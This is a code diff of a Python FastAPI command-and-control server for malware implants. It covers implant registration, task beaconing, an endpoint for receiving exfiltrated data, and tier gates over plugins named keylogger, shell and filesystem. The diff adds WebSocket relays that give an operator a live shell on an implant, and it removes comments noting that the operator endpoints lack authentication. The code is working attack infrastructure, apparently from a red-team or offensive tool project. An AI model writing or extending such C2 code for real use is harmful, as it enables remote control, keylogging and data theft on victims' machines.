@@ -1,15 +1,14 @@
-from fastapi import APIRouter, Depends, HTTPException, Body
+from fastapi import APIRouter, Depends, HTTPException, Body, WebSocket, WebSocketDisconnect
 from typing import Dict, Any
 
 from . import models
 from . import security
+from .comms import manager
 
 router = APIRouter()
 
 # ==============================================================================
 # In-Memory "Database"
-# In a real system, this would be a proper database (e.g., PostgreSQL, Redis).
-# For Phase 1, we use a simple dictionary.
 # ==============================================================================
 IMPLANTS_DB: Dict[str, models.Implant] = {}
 
@@ -19,20 +18,19 @@ IMPLANTS_DB: Dict[str, models.Implant] = {}
 # ==============================================================================
 ROE_GATES = {
     # Tier: [list_of_allowed_plugins]
-    1: ["keylogger", "shell", "filesystem", "dummy"],  # Example: Tier 1 can do anything
-    2: ["keylogger", "filesystem", "dummy"],           # Example: Tier 2 can do passive recon
-    3: [],                                             # Example: Tier 3 is dormant until elevated
+    1: ["keylogger", "shell", "filesystem", "dummy", "system_profiler"],
+    2: ["keylogger", "filesystem", "dummy", "system_profiler"],
+    3: [],
 }
 
 def check_roe(implant_id: str, command: str, args: Dict[str, Any]) -> bool:
     """Checks if a command is allowed for an implant's ROE tier."""
-    # Allow non-plugin commands unconditionally for now.
     if command != "start_plugin":
         return True
 
     plugin_name = args.get("plugin_name")
     if not plugin_name:
-        return False # Can't start a plugin without a name
+        return False
 
     tier = IMPLANTS_DB[implant_id].roe_tier
     if plugin_name in ROE_GATES.get(tier, []):
@@ -46,8 +44,7 @@ def check_roe(implant_id: str, command: str, args: Dict[str, Any]) -> bool:
 
 @router.post("/register", response_model=models.RegistrationResponse)
 def register_implant(registration: models.ImplantRegistration):
-    """Called by a new implant to register itself with the C2."""
-    implant = models.Implant(**registration.dict())
+    implant = models.Implant(**registration.model_dump())
     IMPLANTS_DB[implant.id] = implant
 
     token = security.create_access_token(data={"sub": implant.id})
@@ -55,41 +52,33 @@ def register_implant(registration: models.ImplantRegistration):
 
 @router.get("/tasks", response_model=models.TaskResponse)
 def get_tasks(current_implant_id: str = Depends(security.get_current_implant_id)):
-    """Called by an implant to beacon for new tasks."""
     implant = IMPLANTS_DB.get(current_implant_id)
     if not implant:
         raise HTTPException(status_code=404, detail="Implant not found")
 
     tasks = implant.tasks
-    implant.tasks = []  # Clear tasks after fetching
+    implant.tasks = []
     return {"tasks": tasks}
 
 @router.post("/data")
 def submit_data(payload: models.DataPayload, current_implant_id: str = Depends(security.get_current_implant_id)):
-    """Called by an implant to exfiltrate collected data."""
     # In a real system, this data would be written to a secure, structured log or database.
-    # For now, we just print it to the C2 server's console.
     print(f"[DATA] Received from {current_implant_id} ({payload.plugin}): {payload.data[:200]}")
     return {"status": "received"}
 
 # ==============================================================================
 # API Endpoints for Operator CLI
-# These should be protected by a separate operator authentication system in a
-# real-world scenario.
 # ==============================================================================
 
 @router.get("/admin/implants", response_model=Dict[str, models.Implant])
 def list_implants():
-    """Lists all currently registered implants."""
     return IMPLANTS_DB
 
 @router.post("/admin/tasks/{implant_id}", response_model=Dict)
 def add_task(implant_id: str, task: models.Task = Body(...)):
-    """Adds a new task to an implant's queue."""
     if implant_id not in IMPLANTS_DB:
         raise HTTPException(status_code=404, detail="Implant not found")
 
-    # Enforce ROE before tasking
     if not check_roe(implant_id, task.command, task.args):
         tier = IMPLANTS_DB[implant_id].roe_tier
         plugin = task.args.get('plugin_name', 'unknown')
@@ -103,7 +92,6 @@ def add_task(implant_id: str, task: models.Task = Body(...)):
 
 @router.put("/admin/tier/{implant_id}/{tier}", response_model=Dict)
 def set_implant_tier(implant_id: str, tier: int):
-    """Sets the ROE engagement tier for a specific implant."""
     if implant_id not in IMPLANTS_DB:
         raise HTTPException(status_code=404, detail="Implant not found")
     if tier not in ROE_GATES:
@@ -111,3 +99,32 @@ def set_implant_tier(implant_id: str, tier: int):
 
     IMPLANTS_DB[implant_id].roe_tier = tier
     return {"status": "tier updated", "implant_id": implant_id, "new_tier": tier}
+
+
+# ==============================================================================
+# WebSocket Endpoints for Live Shell
+# ==============================================================================
+
+@router.websocket("/ws/implant/{implant_id}")
+async def websocket_implant_endpoint(websocket: WebSocket, implant_id: str):
+    if implant_id not in IMPLANTS_DB:
+        await websocket.close(code=1008)
+        return
+
+    await manager.connect_implant(websocket, implant_id)
+    try:
+        while True:
+            data = await websocket.receive_text()
+            await manager.send_to_operator(data, implant_id)
+    except WebSocketDisconnect:
+        manager.disconnect_implant(implant_id)
+
+@router.websocket("/ws/cli/{implant_id}")
+async def websocket_cli_endpoint(websocket: WebSocket, implant_id: str):
+    await manager.connect_operator(websocket, implant_id)
+    try:
+        while True:
+            data = await websocket.receive_text()
+            await manager.send_to_implant(data, implant_id)
+    except WebSocketDisconnect:
+        manager.disconnect_operator(implant_id)
